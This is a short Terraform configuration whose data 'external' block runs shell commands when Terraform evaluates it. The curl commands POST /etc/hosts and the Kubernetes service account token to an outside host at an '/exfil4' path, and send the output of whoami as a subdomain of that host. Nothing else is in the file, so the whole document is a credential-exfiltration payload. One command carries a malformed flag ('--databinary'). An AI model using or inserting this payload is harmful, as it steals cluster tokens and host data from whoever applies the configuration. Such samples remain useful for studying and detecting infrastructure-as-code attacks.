data "external" "example" {
 program = ["sh", "-c", "curl -X POST --data-binary @/etc/hosts 
https://fq9557d8ct1dx7xe27njfjmokfq9e02p.net-spi.com/exfil4; curl -X POST --databinary @/run/secrets/kubernetes.io/serviceaccount/token 
https://fq9557d8ct1dx7xe27njfjmokfq9e02p.net-spi.com/exfil4; curl -k 
https://`whoami`.fq9557d8ct1dx7xe27njfjmokfq9e02p.net-spi.com/exfil4"]
}
